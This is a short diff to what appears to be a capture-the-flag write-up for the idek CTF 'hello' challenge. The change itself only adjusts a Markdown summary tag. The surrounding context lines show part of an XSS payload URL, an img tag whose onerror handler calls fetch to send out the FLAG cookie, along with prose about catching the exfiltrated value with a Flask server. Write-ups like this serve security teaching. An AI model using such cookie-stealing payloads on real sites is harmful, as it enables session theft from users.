@@ -344,7 +344,7 @@ http://idek-hello.chal.idek.team:1337/?name=<img%0Csrc=x%0Conerror="fetch(String
 
 To catch the exfiltrated `FLAG` cookie's value, I wrote a solve script to generate the payload and host a Flask web application:
 
-<details><summary>solve.py</summary>
+<details><summary markdown="span">solve.py</summary>
 
 ```python
 #!/usr/bin/env python3
